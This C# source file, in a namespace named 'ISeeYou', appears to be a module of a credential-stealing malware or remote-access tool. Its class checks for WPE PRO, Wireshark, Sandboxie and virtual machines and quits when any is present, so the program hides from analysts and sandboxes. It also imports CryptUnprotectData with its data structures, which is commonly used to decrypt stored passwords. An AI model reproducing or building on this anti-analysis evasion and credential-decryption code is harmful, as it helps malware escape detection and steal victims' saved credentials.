using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;

namespace ISeeYou
{
    class Antis
    {
        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
        [DllImport("wininet.dll")]
        internal static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool CryptUnprotectData(ref Structures.DataBlob pCipherText, ref string pszDescription, ref Structures.DataBlob pEntropy, IntPtr pReserved, ref Structures.CryptprotectPromptstruct pPrompt, int dwFlags, ref Structures.DataBlob pPlainText);

        public static void Anti(bool wpe, bool wireshark, bool sandboxie, bool vbox)
        {
            if(wpe)
                DetectWPE();
            if(wireshark)
                DetectWireshark();
            if (sandboxie)
                SandBoxie();
            if (vbox)
                DetectVirtualMachine();
        }
        private static void DetectWPE()
        {
            Process[] ProcessList = Process.GetProcesses();
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Equals("WPE PRO"))
                {
                    Environment.Exit(1);
                }
            }
        }
        private static void DetectWireshark()
        {
            Process[] ProcessList = Process.GetProcesses();
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Equals("The Wireshark Network Analyzer"))
                {
                    Environment.Exit(1);
                }
            }
        }
        private static void SandBoxie()
        {
            if (Process.GetProcessesByName("wsnm").Length > 0 || (GetModuleHandle("SbieDll.dll").ToInt32() != 0))
            {
                Environment.Exit(1);
            }
        }

        private static void DetectVirtualMachine()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
                {
                    foreach (var item in searcher)
                    {
                        if ((item["Manufacturer"].ToString().ToLower() == "microsoft corporation" &&
                             item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
                             item["Manufacturer"].ToString().ToLower().Contains("vmware") ||
                             item["Model"].ToString() == "VirtualBox")
                        {
                            Environment.Exit(1);
                        }
                    }
                }
            }
            catch (System.ObjectDisposedException) {}
            
        }
        public class Structures
        {
            public struct CryptprotectPromptstruct
            {
                public int cbSize;
                public int dwPromptFlags;
                internal IntPtr hwndApp;
                public string szPrompt;
            }

            public struct DataBlob
            {
                public int cbData;
                internal IntPtr pbData;
            }
        }
    }
}
